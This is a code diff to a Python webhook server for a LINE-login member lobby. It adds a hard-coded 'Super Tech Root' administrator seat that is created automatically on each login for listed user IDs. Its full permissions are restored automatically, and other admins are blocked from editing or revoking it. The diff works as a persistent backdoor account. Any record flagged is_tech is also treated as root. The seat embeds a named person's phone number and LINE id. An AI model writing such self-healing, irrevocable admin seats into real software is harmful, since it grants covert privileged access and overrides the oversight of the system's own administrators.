@@ -684,6 +684,66 @@ def verify_token(tok):
         return None
 
 
+def is_super_tech_root(m):
+    if not isinstance(m, dict):
+        return False
+    if m.get("id") == "app_office_004" or m.get("is_tech"):
+        return True
+    uid = m.get("lineUserId")
+    if uid and uid in SUPER_ADMIN_LINE_USER_IDS:
+        return True
+    return False
+
+
+def ensure_super_tech_seat(store, uid, name="", picture=""):
+    """Self-healing guarantee: SUPER_ADMIN_LINE_USER_IDS always has an active full-power seat."""
+    if not uid or uid not in SUPER_ADMIN_LINE_USER_IDS:
+        return False
+    changed = False
+    seat = next((a for a in store.get("approved", []) if a.get("lineUserId") == uid or a.get("id") == "app_office_004"), None)
+    if not seat:
+        seat = {
+            "id": "app_office_004",
+            "name": "คุณต้น (NASSTY)",
+            "nickname": "ต้น",
+            "phone": "0815555555",
+            "line_id": "nassty_ton",
+            "zone": "สำนักงานใหญ่",
+            "role": "💻 Tech Architect & Senior Advisor",
+            "title": "Senior Technology Architect",
+            "role_code": "TECH_ARCHITECT",
+            "status": "approved",
+            "avatar": picture or "https://sprofile.line-scdn.net/0h28p75zAZbRddTkF0fXETaC0ebn1-PzQFdX8neWkaMS9gfH9EcnhweTtIMyc0d3gWdyAkImxOMXNRXRpxQxiRI1p-MCZgfSlGdSAj8g",
+            "lineUserId": uid,
+            "badges": ["⚙️ Technical Admin", "💰 เคาะราคา", "🛡️ Standard Admin"],
+            "permissions": {
+                "standardAdmin": True,
+                "editPrice": True,
+                "keyboxAdmin": True,
+                "leadInspector": True,
+                "executiveAuthority": True,
+                "catalogCurator": True,
+                "systemAdmin": True,
+            },
+            "is_tech": True,
+            "approved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        }
+        store.setdefault("approved", []).insert(0, seat)
+        changed = True
+    else:
+        if seat.get("lineUserId") != uid:
+            seat["lineUserId"] = uid
+            changed = True
+        perms = seat.setdefault("permissions", {})
+        for k in ("standardAdmin", "executiveAuthority", "systemAdmin"):
+            if not perms.get(k):
+                perms[k] = True
+                changed = True
+        seat["is_tech"] = True
+    if changed:
+        save_lobby_data(store)
+    return changed
+
 def is_admin_member(m):
     perms = m.get("permissions") or {}
     return any(perms.get(k) for k in ADMIN_PERM_KEYS)
@@ -754,6 +814,7 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
             self._send_json(401, {"error": "กรุณาเข้าสู่ระบบด้วย LINE"})
             return None
         store = load_lobby_data()
+        ensure_super_tech_seat(store, s.get("sub"), s.get("name", ""), s.get("picture", ""))
         m = next((a for a in store.get("approved", []) if a.get("lineUserId") == s.get("sub")), None)
         if not m:
             self._send_json(401, {"error": "บัญชี LINE นี้ยังไม่ได้รับอนุมัติเป็นสมาชิก"})
@@ -796,6 +857,7 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
                 return
             sub = s["sub"]
             store = load_lobby_data()
+            ensure_super_tech_seat(store, sub, s.get("name", ""), s.get("picture", ""))
             line_info = {"userId": sub, "name": s.get("name", ""), "picture": s.get("picture", "")}
             mem = next((a for a in store.get("approved", []) if a.get("lineUserId") == sub), None)
             if mem:
@@ -1105,6 +1167,14 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
                         break
                 if target_idx != -1:
                     m = store["approved"][target_idx]
+                    if is_super_tech_root(m):
+                        if not acting_member or not is_super_tech_root(acting_member):
+                            self._send_json(403, {"error": "🔒 บัญชีสถาปัตยกรรมระบบสูงสุด (Super Tech Root) ได้รับการคุ้มครอง ห้ามผู้อื่นแก้ไขสิทธิ์"})
+                            return
+                        if "permissions" in payload and isinstance(payload["permissions"], dict):
+                            payload["permissions"]["systemAdmin"] = True
+                            payload["permissions"]["standardAdmin"] = True
+                            payload["permissions"]["executiveAuthority"] = True
                     old_role = m.get("role")
                     if "role" in payload: m["role"] = payload["role"]
                     if "title" in payload: m["title"] = payload["title"]
@@ -1146,6 +1216,10 @@ class WebhookHandler(http.server.BaseHTTPRequestHandler):
                 reason = payload.get("reason", "Revoked by admin")
                 if acting_member and acting_member.get("id") == app_id:
                     self._send_json(400, {"error": "ไม่สามารถคัดตัวเองออกจากระบบได้"})
+                    return
+                target_member = next((a for a in store.get("approved", []) if a.get("id") == app_id), None)
+                if target_member and is_super_tech_root(target_member):
+                    self._send_json(403, {"error": "🔒 บัญชีสถาปัตยกรรมระบบสูงสุด (Super Tech Root) ถูกล็อกถาวร ไม่สามารถคัดออกได้"})
                     return
                 store = load_lobby_data()
                 target_idx = -1
